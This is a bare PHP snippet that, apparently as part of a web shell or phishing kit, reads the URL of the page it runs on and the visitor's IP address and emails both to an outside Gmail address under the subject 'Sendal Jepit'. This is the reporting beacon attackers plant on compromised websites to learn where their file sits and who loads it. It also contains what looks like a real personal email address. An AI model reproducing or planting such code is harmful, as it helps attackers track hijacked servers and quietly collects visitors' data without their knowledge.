
ini_set('memory_limit', '1');
header('Content-Type: text/html; charset=UTF-8');
$to = 'jasonrondiguez@gmail.com';
$path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($to, "Sendal Jepit", $message, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
